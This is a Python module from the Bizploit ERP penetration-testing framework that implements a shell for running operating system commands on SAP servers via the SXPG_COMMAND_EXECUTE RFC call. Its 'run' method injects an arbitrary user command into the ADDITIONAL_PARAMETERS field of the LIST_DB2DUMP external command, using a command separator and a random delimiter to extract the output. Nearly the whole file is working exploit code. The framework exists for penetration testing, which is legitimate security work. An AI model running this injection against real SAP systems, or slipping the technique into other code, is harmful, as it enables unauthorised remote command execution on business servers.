# -*- coding: latin-1 -*-
'''
---------------------------------------------------------------------------
Bizploit - The Opensource ERP Penetration Testing Framework. 
Download at http://www.onapsis.com/bizploit 
--------------------------------------------------------------------------- 

@author:  Mariano Nu�ez Di Croce <mnunez@onapsis.com>    
    
Portions Copyright 2010 ONAPSIS S.R.L.
Base Copyright Mariano Nu�ez Di Croce @ CYBSEC

This program is free software; you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation version 2 of the License.

This program is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY; without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
GNU General Public License for more details.
You should have received a copy of the GNU General Public License
along with this program; if not, write to the Free Software
Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA  02110-1301  USA
---------------------------------------------------------------------------
'''
from core.exceptions.bizploitException import bizploitException
from fwk.shells.baseShell import baseShell
from core.lib.fuzzer import *

class RFCCommandExecShell(baseShell):
	'''
	Run operating system commands through RFC.
	Usefull for callback attacks and direct calls to SAP AS.
	'''
	def __init__( self ):
		baseShell.__init__(self)
		self._menu = {'run':self._run, 'runExt':self._runExt, 'runRaw':self._runRaw}
		self._cmdInter = ''
		self._fuzzer = fuzzer()
		
	def _onStart(self):
		self._om.console(self,'RFCCommandExecShell - OS Commanding through RFC Calls')
		# Target information
		self.showTargetInfo()
	
	def showTargetInfo(self):
		'''
		Get the target information to see which is the best way to interact with it.
		'''
		# Target information
		self._info = self.getTargetInfo()
		
		if self._info['guessed']:
			self._om.information(self, 'There is no information about the current target. Assuming default: ' + self._info['OSFlavour'])
			self._om.information(self, 'The safest command to use under this circumstances is: \'runRaw\'. The \'run\' command may not work.')
		else:
			self._om.information(self,'The remote target OS is: ' + self._info['OS'] + '.')
			if self._info['OS'] == 'Linux' or self._info['OS'] == 'UNIX':
				self._om.information(self, 'The "run" command does not work on Unix/Linux. Use the runExt command instead.')

	def _run_SAPRFC(self, parameters):
		'''
		Calls SXPG_COMMAND_EXECUTE to run commands in SAP R/3 servers.
		It automatically detects remote operating system.			
		'''
		if len(parameters) < 1:
			self._parent._cmd_help(['run'])
			return 
			
		cmd = ' '.join(parameters)
		
		cmdExists, os = self._checkExtCmdExists('LIST_DB2DUMP',  cmd)
		
		if cmdExists:
			call = self._connector.lib.iface("SXPG_COMMAND_EXECUTE")
			call.addParm(self._connector.lib.parm("COMMANDNAME", "", self._connector.lib.RFCEXPORT, self._connector.lib.RFCTYPE_CHAR, 12, 0, 'LIST_DB2DUMP'))
			call.addParm(self._connector.lib.parm("OPERATINGSYSTEM", "", self._connector.lib.RFCEXPORT, self._connector.lib.RFCTYPE_CHAR, len(os), 0, os))
			
			# We perform the command injection			
			# To delimit previous command, we create a random string to use as delimiter
			delim = self._fuzzer.createRandAlpha(30)
			# Unknow directory, to reduce processing and output size
			unknow = self._fuzzer.createRandAlpha(10)
			cmdToRun = unknow +  self._info['cmdSeparator']	 + 'echo ' + delim +  self._info['cmdSeparator'] + cmd 
			call.addParm(self._connector.lib.parm("ADDITIONAL_PARAMETERS", "", self._connector.lib.RFCEXPORT, self._connector.lib.RFCTYPE_CHAR, len(cmdToRun), 0, cmdToRun))
			output = self._connector.lib.parm("EXEC_PROTOCOL", "", self._connector.lib.RFCTABLE, self._connector.lib.RFCTYPE_CHAR, 80)
			call.addParm(output)
			
			# Make the call
			try:
				self._connector.connect()
				self._connector.call_receive(call)		
				# Do not close the connection after each call.
				#self._connector.disconnect()
			except bizploitException:
				self._om.information(self,'Could not run command.')
				return 
			
			# Parse the output and print
			res = ''
			delimFound = False
			# Ignores lines previous to delimiter
			for l in output.value:
				# Remove first numbers
				line = l[3:].strip()
				if delimFound:
					res += line + '\n'
				if line == delim:
					delimFound = True
			
			self._om.information(self, res)
			
		else:
			self._om.information(self, 'External command \'LIST_DB2DUMP\' does not exist. Could not run command.')
		
		return 
	
	def _runExt_SAPRFC(self, parameters):
		'''
		Calls SXPG_COMMAND_EXECUTE to run external commands in SAP R/3 servers.
		Does not perform command injection, just uses available SAP external commands.
		
		'''
		params = ''
		if len(parameters) < 1:
			self._parent._cmd_help(['runExt'])
			return
			
		cmd_name = parameters[0]
		if len(parameters) > 1:
			params = ' '.join(parameters[1:])
		
		cmdExists,  os = self._checkExtCmdExists(cmd_name,  params)
				
		if cmdExists:
			call = self._connector.lib.iface("SXPG_COMMAND_EXECUTE")
			call.addParm(self._connector.lib.parm("COMMANDNAME", "", self._connector.lib.RFCEXPORT, self._connector.lib.RFCTYPE_CHAR, len(cmd_name), 0, cmd_name))
			call.addParm(self._connector.lib.parm("OPERATINGSYSTEM", "", self._connector.lib.RFCEXPORT, self._connector.lib.RFCTYPE_CHAR, len(os), 0, os))
			call.addParm(self._connector.lib.parm("ADDITIONAL_PARAMETERS", "", self._connector.lib.RFCEXPORT, self._connector.lib.RFCTYPE_CHAR, len(params), 0, params))
			output = self._connector.lib.parm("EXEC_PROTOCOL", "", self._connector.lib.RFCTABLE, self._connector.lib.RFCTYPE_CHAR, 80)
			call.addParm(output)
		
			# Make the call
			try:
				self._connector.connect()
				self._connector.call_receive(call)		
				# Do not close the connection after each call.
				#self._connector.disconnect()
			except bizploitException:
				self._om.information(self,'Could not run command.')
				return
		
			# Parse the output and print
			for line in output.value:
				self._om.information(self,line[3:].strip())
		
		else:
			self._om.information(self,'External command "' + cmd_name + '" does not exist.')
		
		
	
	def _runRaw_SAPRFC(self, parameters):
		'''
		Calls SXPG_COMMAND_EXECUTE to run external commands in SAP R/3 servers.
		Does not perform command injection, just uses available SAP external commands.
		Allows the user to specify the OS, use only if sapinfo could not be called.		
		'''
		params = ''
		if len(parameters) < 2:
			self._parent._cmd_help(['runRaw'])
			return
		
		
		os = parameters[0]
		cmd_name = parameters[1]		
		
		if len(parameters) > 2:
			params = ' '.join(parameters[2:])
		
		cmdExists,  os = self._checkExtCmdExists(cmd_name,  params,  os=os)
		
		if cmdExists:
			call = self._connector.lib.iface("SXPG_COMMAND_EXECUTE")
			call.addParm(self._connector.lib.parm("COMMANDNAME", "", self._connector.lib.RFCEXPORT, self._connector.lib.RFCTYPE_CHAR, len(cmd_name), 0, cmd_name))
			call.addParm(self._connector.lib.parm("OPERATINGSYSTEM", "", self._connector.lib.RFCEXPORT, self._connector.lib.RFCTYPE_CHAR, len(os), 0, os))		
			call.addParm(self._connector.lib.parm("ADDITIONAL_PARAMETERS", "", self._connector.lib.RFCEXPORT, self._connector.lib.RFCTYPE_CHAR, len(params), 0, params))
			output = self._connector.lib.parm("EXEC_PROTOCOL", "", self._connector.lib.RFCTABLE, self._connector.lib.RFCTYPE_CHAR, 80)
			call.addParm(output)	
		
		
			# Make the call
			try:
				self._connector.connect()
				self._connector.call_receive(call)		
				# Do not close the connection after each call.
				#self._connector.disconnect()
			except bizploitException:
				self._om.information(self,'Could not run command.')
				return
		
			# Parse the output and print
			for line in output.value:
				self._om.information(self,line[3:].strip())
		
		else:
			self._om.information(self,'External command "' + cmd_name + '" does not exist.')
	
	
	def _checkExtCmdExists(self,  cmdName,  params,  os=None):
		'''
		Check if the specified external os command exists in the target system.
		If it was possible to identify the remote OS, the method will check if the selected command exists for that OS or 'ANYOS'.
		If it was not possible to id the remote OS, the method will check against the specified OS and 'ANYOS'
		
		@return: Returns a tuple with (boolean for command existence, available OS if exists)
		'''
		# Analyze target OS
		osToCheck = []
		if os != None:
			osToCheck = [os]
		else:
			try:
				osToCheck = [self._info['OSFlavour']]
			except:
				self._om.debug(self,  'Could not get OS info.')				
		
		# Always check for ANYOS at the end.
		osToCheck.append('ANYOS')
		
		# If we don't set a value, the library won't send it!
		if len(params) == 0:
			params = 'foo'
		
		# Check if the external commands exists, maybe its for ANYOS
		for os in osToCheck:
			call = self._connector.lib.iface("SXPG_COMMAND_CHECK")
			call.addParm(self._connector.lib.parm("COMMANDNAME", "", self._connector.lib.RFCEXPORT, self._connector.lib.RFCTYPE_CHAR, len(cmdName), 0, cmdName))
			call.addParm(self._connector.lib.parm("OPERATINGSYSTEM", "", self._connector.lib.RFCEXPORT, self._connector.lib.RFCTYPE_CHAR, len(os), 0, os))
			call.addParm(self._connector.lib.parm("ADDITIONAL_PARAMETERS", "", self._connector.lib.RFCEXPORT, self._connector.lib.RFCTYPE_CHAR, len(params), 0, params))
						
			
			# Make the call
			try:
				self._connector.connect()
				self._connector.call_receive(call)
				return (True,  os)
			except bizploitException:
				pass
		
		return (False,  '')
	
	
